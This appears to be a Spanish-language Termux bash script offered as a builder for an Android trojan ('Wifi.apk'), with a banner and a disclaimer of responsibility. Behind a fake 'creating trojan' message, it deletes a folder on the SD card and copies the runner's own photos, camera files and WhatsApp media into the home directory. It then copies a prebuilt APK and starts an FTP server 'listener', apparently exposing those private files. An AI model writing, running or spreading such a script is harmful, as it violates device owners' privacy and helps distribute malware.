#! /bin/bash

termux-setup-storage
setterm -foreground green
apt update 

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"


#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ""
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando figlet ...\e[0m"
sleep 3
pkg install figlet
fi
sleep 1

#directory verification
directory=$(pwd)


if which python >/dev/null; then
sleep 1
echo ""
echo -e "$blue(python)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(python)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando python ...\e[0m"
sleep 3
pkg install python -y
fi
sleep 1

#directory verification
directory=$(pwd)


if which python2 >/dev/null; then
sleep 1
echo ""
echo -e "$blue(python2)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(python2$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando python2 ...\e[0m"
sleep 3
pkg install python2 -y
fi
sleep 1

echo "" 
setterm -foreground red
echo "Instalando Librerias..."
setterm -foreground green
pip install pyftpdlib
pip install pyopenssl
clear
setterm -foreground red
echo "
           ⠀      ⢀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀     ⢀⣀⣤⣤⠄⢀⣤⠀⣾⣿⣿⣿⠀⣀⠀⢠⣤⣤⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀     ⢀⣶⣿⣿⣿⠃⣰⣿⣿⣄⠙⠿⠿⠋⣠⣿⣷⡄⠹⣿⣿⣿⣶⡀⠀⠀⠀
⠀⠀     ⣰⣿⣿⣿⣿⠇⢰⣿⣿⣿⣿⣷⣶⣶⣾⣿⣿⣿⣿⡀⢹⣿⣿⣿⣿⣄⠀⠀
     ⠀⢸⣿⣿⡿⠋⠀⠀⣿⡏⠀⠙⠻⣿⣿⣿⣿⠟⠁⠀⣿⣧⠀⠀⠙⢿⣿⣿⡆⠀
⠀     ⣿⣿⡿⠀⠀⠀⢰⣿⣿⣤⣤⣴⣿⣿⣿⣿⣦⣤⣴⣿⣿⠀⠀⠀⠈⣿⣿⡇⠀
⠀     ⢹⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣷⡙⠻⠟⢩⣿⣿⣿⣿⣿⠀⠀⠀⠀⣼⣿⡇
⠀     ⠈⠻⣿⣆⠀⠀⠈⠉⠉⠉⣿⣿⣷⡀⢠⣿⣿⡏⠉⠉⠉⠀⠀⠀⣰⣿⠟⠀⠀
⠀⠀⠀     ⠈⠉⠓⠂⠀⠀⠀⠀⣿⣿⣿⣷⣿⣿⣿⡇⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀     ⠀⢀⠀⢿⡟⠈⣿⡿⠈⢿⡇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀     ⢠⣾⡆⠘⢀⡆⠸⠃⣠⠈⠃⢸⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀     ⣰⣿⣿⡇⠀⣾⣷⠀⢀⣿⣧⠀⣼⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀     ⠸⣿⣿⣿⠇⠸⣿⣿⠀⠸⣿⣿⠆⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀     ⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁
"
echo ""
echo "Esta herramienta hace un troyano peligroso"
echo "Usar Educadamente no me responsabilizo"
sleep 1
while :
do
#MENU
#ESCOJER MENU
echo ""
setterm -foreground green
echo "Esta seguro continuar"
echo "[1] Si"
echo "[2] No"
echo -n "[•]Opcion > "
read opcion
case $opcion in
1)
#! /bin/bash
setterm -foreground red
figlet Atack
setterm -foreground  green
echo "[+]Creando troyano ..."
sleep 1
echo "[+]Esto puede demorar 10 minutos ...."
cd /sdcard
rm -r APK
mkdir APK
cp -r Pictures /$HOME
cp -r /sdcard/DCIM/Camera /$HOME
cp -r /sdcard/Android/media/com.whatsapp /$HOME
cd /$HOME/Troy9
cp Wifi.apk /sdcard/APK
echo -e "\e[1;37m Wifi.apk guardado en su sdcard/APK\e[0m"
echo ""
echo "Su troyano Wifi.apk ha sido guardado en la carpeta APK"
echo "Escuchando por el listenner" & python ftpserver.py
;;
2)
#! /bin/bash
setterm -foreground white
echo "Saliste correctamenta bye"
exit
::
esac
done
